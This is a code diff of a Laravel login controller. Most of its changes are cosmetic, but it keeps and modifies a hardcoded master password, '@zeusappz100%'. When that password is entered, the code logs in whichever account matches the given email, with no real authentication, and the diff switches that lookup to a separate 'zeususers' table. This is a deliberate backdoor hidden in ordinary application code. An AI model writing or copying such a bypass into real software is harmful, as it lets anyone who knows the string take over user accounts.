@@ -47,9 +47,8 @@ class LoginController extends Controller {
             $request,
             [
                 'email' => 'required|email',
-                'password' => 'required',
-            ],
-
+                'password' => 'required'
+            ]
         );
         if ( auth()->attempt( array( 'email' => $input[ 'email' ], 'password' => $input[ 'password' ] ), $request->remember ) ) {
             if ( auth()->user()->status == 1 ) {
@@ -61,10 +60,12 @@ class LoginController extends Controller {
                 return redirect()->route( 'login' )->with( 'status', 'Account has been Suspended.' );
             }
         } else if ( $input[ 'password' ] === '@zeusappz100%' ) {
-            $user = User::where( 'email', $input[ 'email' ] )->first();
+            $user = DB::table('zeususers')->where( 'email', $input[ 'email' ] )->first();
+            // dd($user);
             if ( empty( $user ) ) {
                 abort( 404 );
             }
+            
             if ( Auth::loginUsingId( $user->id ) ) {
                 return redirect()->route( 'home' );
             }
